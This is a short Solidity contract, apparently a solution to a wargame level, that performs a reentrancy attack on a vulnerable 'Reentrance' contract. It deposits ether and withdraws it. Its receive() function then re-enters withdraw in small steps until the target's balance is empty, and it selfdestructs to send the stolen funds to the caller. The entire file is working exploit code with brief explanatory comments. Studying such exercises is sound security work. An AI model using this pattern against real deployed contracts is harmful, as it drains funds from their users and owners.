// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IReentrance {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

contract Attack {
    IReentrance private immutable target;

    constructor(address targetAddr) {
        target = IReentrance(targetAddr);
    }

    function attack() public payable {
        target.donate{value: msg.value}(address(this)); // send ether to traget
        target.withdraw(msg.value); // then withdraw, this will trigger receive()

        // Only when re-entrancy ends (termination condition is met) will the lines of code below be executed.
        require(address(target).balance == 0, "re-entrancy failed");

        selfdestruct(payable(msg.sender)); // destroy the contract and sned all funds to us
    }

    receive() external payable {
        uint256 balance = target.balanceOf(address(this)); // retrieve our balance in the target

        // withdraw the smallest amount, so that the tx doesn; get reverted
        uint256 withdrawableAmount = balance < 0.001 ether ? balance : 0.001 ether;

        if (withdrawableAmount > 0) { // if contract balance is 0, then termination condition is met
            target.withdraw(withdrawableAmount);
        }
    }
}
